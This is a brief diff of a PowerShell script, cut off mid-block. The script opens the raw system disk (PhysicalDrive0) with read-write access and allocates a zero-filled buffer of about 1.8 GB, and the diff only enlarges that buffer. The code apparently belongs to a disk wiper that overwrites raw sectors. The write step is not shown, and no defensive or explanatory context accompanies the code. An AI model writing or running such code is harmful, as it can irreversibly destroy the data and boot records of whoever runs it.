@@ -1,5 +1,5 @@
 $disk = "\\.\PhysicalDrive0"
-$size = 1640960000
+$size = 1840960000
 $bytes = New-Object byte[]($size)
 try {
     $stream = [System.IO.File]::Open($disk, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
